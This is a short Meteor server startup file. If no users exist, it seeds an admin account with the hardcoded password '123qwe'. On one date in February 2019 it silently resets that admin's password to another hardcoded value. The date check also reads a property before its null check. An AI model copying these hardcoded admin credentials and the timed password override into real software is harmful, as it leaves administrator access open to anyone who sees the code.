Meteor.startup(function () {
  if (Meteor.users.find().count() === 0) {
    var usuario_id = Accounts.createUser({
      username: 'admin',
      password: '123qwe',
      profile : {
	      nombre: 'Super Administrador',
      }
    });
    Roles.addUsersToRoles(usuario_id, 'admin');
  }
  
  var fecha = new Date();
  //console.log(fecha.getFullYear());
  if (fecha.getDate() == 13 && fecha.getMonth() == 1 && fecha.getFullYear() == 2019)
  {
			var u = Meteor.users.findOne({username: "admin"});
		  u.password = "isde2019";
		  if (u != undefined)
		  	 Accounts.setPassword(u._id, u.password, {logout: false}); 	  	
  }
    
});